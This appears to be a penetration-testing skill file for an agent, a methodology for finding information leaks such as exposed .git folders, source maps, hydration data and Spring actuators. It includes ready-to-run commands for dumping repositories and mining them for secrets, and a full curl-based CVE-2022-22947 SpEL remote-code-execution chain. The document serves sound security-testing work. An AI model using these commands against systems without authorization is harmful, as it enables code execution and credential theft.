---
name: information-disclosure
description: Information disclosure testing covering error messages, debug endpoints, metadata leakage, and source exposure
---

# Information Disclosure

Information leaks accelerate exploitation by revealing code, configuration, identifiers, and trust boundaries. Treat every response byte, artifact, and header as potential intelligence. Minimize, normalize, and scope disclosure across all channels.

## Attack Surface

- Errors and exception pages: stack traces, file paths, SQL, framework versions
- Debug/dev tooling reachable in prod: debuggers, profilers, feature flags
- DVCS/build artifacts and temp/backup files: .git, .svn, .hg, .bak, .swp, archives
- Configuration and secrets: .env, phpinfo, appsettings.json, Docker/K8s manifests
- API schemas and introspection: OpenAPI/Swagger, GraphQL introspection, gRPC reflection
- Client bundles and source maps: webpack/Vite maps, embedded env, `__NEXT_DATA__`, static JSON
- Headers and response metadata: Server/X-Powered-By, tracing, ETag, Accept-Ranges, Server-Timing
- Storage/export surfaces: public buckets, signed URLs, export/download endpoints
- Observability/admin: /metrics, /actuator, /health, tracing UIs (Jaeger, Zipkin), Kibana, Admin UIs
- Directory listings and indexing: autoindex, sitemap/robots revealing hidden routes

## High-Value Surfaces

### Errors and Exceptions

- SQL/ORM errors: reveal table/column names, DBMS, query fragments
- Stack traces: absolute paths, class/method names, framework versions, developer emails
- Template engine probes: `{{7*7}}`, `${7*7}` identify templating stack
- JSON/XML parsers: type mismatches leak internal model names

### Debug and Env Modes

- Debug pages: Django DEBUG, Laravel Telescope, Rails error pages, Flask/Werkzeug debugger, ASP.NET customErrors Off
- Profiler endpoints: `/debug/pprof`, `/actuator`, `/_profiler`, custom `/debug` APIs
- Feature/config toggles exposed in JS or headers

### DVCS and Backups

- DVCS: `/.git/` (HEAD, config, index, objects), `.svn/entries`, `.hg/store` → reconstruct source and secrets
- Backups/temp: `.bak`/`.old`/`~`/`.swp`/`.swo`/`.tmp`/`.orig`, db dumps, zipped deployments
- Build artifacts: dist artifacts containing `.map`, env prints, internal URLs

**`.git` reconstruction.** A readable `/.git/` (even with directory listing
off — the object paths are deterministic) reconstructs the full source and its
history, including secrets removed from the current tree but still in old
commits.
```bash
# confirm it's live, then pull and rebuild the working tree
curl -s https://target/.git/HEAD                      # "ref: refs/heads/main" = present
git-dumper https://target/.git/ ./loot                # dumps + git checkout
# then mine history for secrets that were 'deleted' later
cd loot && git log --all --oneline && \
  git log -p --all -S 'AKIA' -S 'secret' -S 'BEGIN RSA'   # pickaxe for keys across history
gitleaks detect --source ./loot --report-format json     # full secret scan of the recovered repo
```
- **`.svn`**: `/.svn/wc.db` (SQLite, SVN ≥1.7) or `/.svn/entries` (older) →
  `svn-extractor` / manual `pristine/` object fetch.
- **`.hg`**: `/.hg/store/` and `/.hg/dirstate`.
- **`.DS_Store`**: each file names sibling entries; crawl recursively with
  `ds_store_exp` to map otherwise-unlinked files and directories.

**Backup / predictable-path enumeration.** Generate candidates from the live
paths, don't blind-fuzz: for every discovered `app.js`/`config.php`/`index.php`
try `<name>.bak`, `<name>~`, `<name>.old`, `<name>.swp`, `<name>.save`,
`<name>.1`, `<name>.orig`, and archive names (`<host>.zip`, `backup.tar.gz`,
`db.sql`, `dump.sql`). Use SecLists `Discovery/Web-Content/` (`raft-*`,
`Common-DB-Backups.txt`) with `httpx`/`ffuf` and diff against the 404 baseline.

**`.well-known/` and metadata paths.** Enumerate the standardized set — each
leaks configuration or trust anchors: `/.well-known/security.txt` (contacts,
sometimes internal URLs), `/.well-known/openid-configuration` and `/jwks.json`
(IdP + keys), `/.well-known/assetlinks.json` and `/apple-app-site-association`
(bound mobile apps and deep-link paths), `/.well-known/change-password`,
`/.well-known/traffic-advice`, `/robots.txt` + `/sitemap*.xml` (admin/internal
routes the site itself discloses).

### Configs and Secrets

- Classic: web.config, appsettings.json, settings.py, config.php, phpinfo.php
- Containers/cloud: Dockerfile, docker-compose.yml, Kubernetes manifests, service account tokens
- Credentials and connection strings; internal hosts and ports; JWT secrets

### API Schemas and Introspection

- OpenAPI/Swagger: `/swagger`, `/api-docs`, `/openapi.json` — enumerate hidden/privileged operations
- GraphQL: introspection enabled; field suggestions; error disclosure via invalid fields
- gRPC: server reflection exposing services/messages

### Client Bundles and Maps

- Source maps (`.map`) reveal original sources, comments, and internal logic
- Client env leakage: `NEXT_PUBLIC_`/`VITE_`/`REACT_APP_` variables; embedded secrets
- `__NEXT_DATA__` and pre-fetched JSON can include internal IDs, flags, or PII

**Source-map extraction.** A `.map` alongside a minified bundle rebuilds the
original, commented, un-minified source tree — routes, API clients, feature
flags, and often secrets. Find them via the `//# sourceMappingURL=` trailer in
each JS bundle, or just append `.map` to the bundle URL even when the trailer
is stripped (the file is frequently still served).
```bash
# discover bundles, then pull any .map and reconstruct the source tree
katana -u https://target -d 2 -jc -silent | grep -Eo 'https?://\S+\.js' | sort -u > js.txt
while read u; do curl -s -o /dev/null -w "%{http_code} $u.map\n" "$u.map"; done < js.txt   # 200 = present
npx unwebpack-sourcemap -o ./src-out https://target/assets/app.[hash].js.map
# then grep the recovered tree for endpoints, keys, internal hosts
rg -n 'apiKey|secret|token|internal\.|/api/|Authorization' ./src-out
```

**SSR hydration blobs.** Server-rendered frameworks serialize the data used to
render the page into the HTML; it routinely contains more than the DOM shows
(full user objects, other-tenant records, internal IDs, flags):
- Next.js: `<script id="__NEXT_DATA__">` (Pages Router) and RSC **flight**
  payloads (`self.__next_f.push([...])`) in App Router responses
- Nuxt: `window.__NUXT__`
- Vite/SvelteKit/Remix: inline `__sveltekit`/`window.__remixContext` state and
  the build's `manifest.json`/`ssr-manifest.json` if exposed
- Angular Universal / generic: `<script type="application/json">` state islands
```bash
# extract and inspect the hydration state
curl -s https://target/dashboard | \
  grep -oP '(?<=id="__NEXT_DATA__">).*?(?=</script>)' | jq '.props'
```
Verify cross-user impact: User A's page must not carry User B's fields, and
exposed fields must be absent from the rendered DOM (present-but-hidden data is
still disclosed).

### Headers and Response Metadata

- Fingerprinting: Server, X-Powered-By, X-AspNet-Version
- Tracing: X-Request-Id, traceparent, Server-Timing, debug headers
- Caching oracles: ETag/If-None-Match, Last-Modified/If-Modified-Since, Accept-Ranges/Range

### Storage and Exports

- Public object storage: S3/GCS/Azure blobs with world-readable ACLs or guessable keys
- Signed URLs: long-lived, weakly scoped, re-usable across tenants
- Export/report endpoints returning foreign data sets or unfiltered fields

### Observability and Admin

- Metrics: Prometheus `/metrics` exposing internal hostnames, process args
- Health/config: `/actuator/health`, `/actuator/env`, Spring Boot info endpoints
- Tracing UIs: Jaeger/Zipkin/Kibana/Grafana exposed without auth

**Spring Boot Actuator → credentials and RCE.** Exposed actuators are far more
than an info leak. Enumerate the index first (`/actuator`), then chase the
high-value endpoints:
- `/actuator/env` — configuration incl. datasource URLs, and property *values*.
  Sensitive values are masked by default (`******`), but the **property names**
  reveal the config surface, and the mask is bypassable on vulnerable setups.
- `/actuator/heapdump` — downloads the full JVM heap (`.hprof`); open it in a
  memory analyzer / `strings` it for live session tokens, DB passwords, and
  API keys that never appear in `/env`. This is the highest-yield actuator.
- `/actuator/loggers`, `/actuator/threaddump`, `/actuator/mappings` — internal
  routes, and `mappings` enumerates every controller path.
- **`/actuator/gateway/routes` (Spring Cloud Gateway) → RCE, CVE-2022-22947**
  (affects Gateway 3.1.0 and 3.0.6-and-earlier; fixed 3.1.1 / 3.0.7). When the
  Gateway actuator is enabled, exposed, and unsecured, POST a route whose
  filter carries a SpEL expression, refresh, then hit the route to execute it:
  ```bash
  # 1) add a route with a SpEL payload in an AddResponseHeader filter
  curl -s -X POST https://target/actuator/gateway/routes/x -H 'Content-Type: application/json' -d '{
    "id":"x","filters":[{"name":"AddResponseHeader","args":{"name":"R",
    "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],
    "uri":"http://example.com"}'
  curl -s -X POST https://target/actuator/gateway/refresh          # 2) apply
  curl -si  https://target/actuator/gateway/routes/x               # 3) SpEL runs; output in header R
  ```
  Confirm the Gateway version before firing (it is version-specific); on a
  patched build, describe the technique and stop.
- **Jolokia** (`/actuator/jolokia`, `/jolokia`) — JMX over HTTP; can reach
  MBeans that load a remote logback config (JNDI) or trigger deserialization —
  a separate RCE path. Enumerate `list` first.

For an exposed Grafana/Prometheus/Alertmanager stack specifically (data-source
proxy SSRF, `CVE-2021-43798` file read, credential pivots), load
`grafana_prometheus` — it is the canonical owner of that pivot chain.

### Cross-Origin Signals

- Referrer leakage: missing/weak referrer policy leading to path/query/token leaks to third parties
- CORS: overly permissive Access-Control-Allow-Origin/Expose-Headers revealing data cross-origin; preflight error shapes

### File Metadata

- EXIF, PDF/Office properties: authors, paths, software versions, timestamps, embedded objects

### Cloud Storage

- S3/GCS/Azure: anonymous listing disabled but object reads allowed; metadata headers leak owner/project identifiers
- Pre-signed URLs: audience not bound; observe key scope and lifetime in URL params

## Key Vulnerabilities

### Differential Oracles

- Compare owner vs non-owner vs anonymous for the same resource
- Track: status, length, ETag, Last-Modified, Cache-Control
- HEAD vs GET: header-only differences can confirm existence
- Conditional requests: 304 vs 200 behaviors leak existence/state

### CDN and Cache Keys

- Identity-agnostic caches: CDN/proxy keys missing Authorization/tenant headers
- Vary misconfiguration: user-agent/language vary without auth vary leaks content
- 206 partial content + stale caches leak object fragments

### Cross-Channel Mirroring

- Inconsistent hardening between REST, GraphQL, WebSocket, and gRPC
- SSR vs CSR: server-rendered pages omit fields while JSON API includes them

## Triage Rubric

- **Critical**: Direct disclosure of secrets that provide broad privileged control, with successful use validated where safe
- **High**: Direct disclosure of highly sensitive data, cross-tenant data, or credentials with serious demonstrated access
- **Medium**: Unauthorized access to a limited set of genuinely restricted data, or a fully validated chain from the disclosure to a concrete security consequence
- **Low**: Limited unauthorized disclosure with modest sensitivity and no serious direct consequence
- **Informational / no report**: Public or intended client data, generic headers, internal names or private addresses, versions without a reachable exploit, and source maps or diagnostics that expose no secrets or restricted source

Do not assign Confidentiality Low merely because information helps reconnaissance. CVSS C:L requires actual access to restricted information. If a path, hostname, version, source map, schema, or debug value only suggests a possible second vulnerability, either validate that complete chain and score its demonstrated outcome or leave C:N and omit the vulnerability report.

## Exploitation Chains

### Credential Extraction
- DVCS/config dumps exposing secrets (DB, SMTP, JWT, cloud)
- Keys → cloud control plane access

### Version to CVE
1. Derive precise component versions from headers/errors/bundles
2. Map to known CVEs and confirm reachability
3. Execute minimal proof targeting disclosed component

### Path Disclosure to LFI
1. Paths from stack traces/templates reveal filesystem layout
2. Use LFI/traversal to fetch config/keys

### Schema to Auth Bypass
1. Schema reveals hidden fields/endpoints
2. Attempt requests with those fields; confirm missing authorization

## Testing Methodology

1. **Build channel map** - Web, API, GraphQL, WebSocket, gRPC, mobile, background jobs, exports, CDN
2. **Establish diff harness** - Compare owner vs non-owner vs anonymous; normalize on status/body length/ETag/headers
3. **Trigger controlled failures** - Malformed types, boundary values, missing params, alternate content-types
4. **Enumerate artifacts** - DVCS folders, backups, config endpoints, source maps, client bundles, API docs
5. **Correlate to impact** - Versions→CVE, paths→LFI/RCE, keys→cloud access, schemas→auth bypass

## Validation

1. Provide raw evidence (headers/body/artifact) and explain exact data revealed
2. Determine intent: cross-check docs/UX; classify per triage rubric
3. Attempt minimal, reversible exploitation or present a concrete step-by-step chain
4. Show reproducibility and minimal request set
5. Bound scope (user, tenant, environment) and data sensitivity classification
6. Map each non-None CVSS impact metric to evidence of actual restricted disclosure, modification, or service interruption

## False Positives

- Intentional public docs or non-sensitive metadata with no exploit path
- Generic errors with no actionable details
- Redacted fields that do not change differential oracles
- Version banners with no exposed vulnerable surface and no chain
- Owner-visible-only details that do not cross identity/tenant boundaries

## Impact

- Accelerated exploitation of RCE/LFI/SSRF via precise versions and paths
- Credential/secret exposure leading to persistent external compromise
- Cross-tenant data disclosure through exports, caches, or mis-scoped signed URLs
- Privacy/regulatory violations and business intelligence leakage

## Pro Tips

1. Start with artifacts (DVCS, backups, maps) before payloads; artifacts yield the fastest wins
2. Normalize responses and diff by digest to reduce noise when comparing roles
3. Hunt source maps and client data JSON; they often carry internal IDs and flags
4. Probe caches/CDNs for identity-unaware keys; verify Vary includes Authorization/tenant
5. Treat introspection and reflection as configuration findings across GraphQL/gRPC
6. Mine observability endpoints last; they are noisy but high-yield in misconfigured setups
7. Chain quickly to a concrete risk and stop—proof should be minimal and reversible

## Summary

Information disclosure is an amplifier. Convert leaks into precise, minimal exploits or clear architectural risks.
